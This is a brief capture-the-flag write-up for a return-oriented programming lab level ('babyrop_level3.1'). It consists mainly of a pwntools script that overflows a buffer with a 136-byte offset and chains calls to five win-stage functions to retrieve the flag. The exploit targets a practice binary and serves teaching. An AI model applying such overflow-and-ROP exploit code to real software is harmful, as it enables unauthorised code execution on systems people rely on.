# Return Oriented Programming 3.1

Similar to level 3.0, just with a different offset (136).

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyrop_level3.1")

io = process()

print("===== STARTING EXPLOIT =====")

offset = 136

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.win_stage_1(0x1)
rop.win_stage_2(0x2)
rop.win_stage_3(0x3)
rop.win_stage_4(0x4)
rop.win_stage_5(0x5)

io.sendline(rop.chain())

io.recvuntil(b'Leaving!\n')

print(f'Flag: {io.recvline(False)}')
```
